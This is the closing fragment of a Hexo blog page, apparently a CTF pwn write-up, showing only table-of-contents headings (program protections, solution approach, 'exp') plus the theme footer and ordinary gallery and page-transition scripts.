href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-13"><span class="toc-number">1.14.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-13"><span class="toc-number">1.14.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%8B%97%E6%B1%AA%E6%B1%AA%E6%B1%AA"><span class="toc-number">1.15.</span> <span class="toc-text">小狗汪汪汪</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4-14"><span class="toc-number">1.15.1.</span> <span class="toc-text">程序保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-14"><span class="toc-number">1.15.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-14"><span class="toc-number">1.15.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>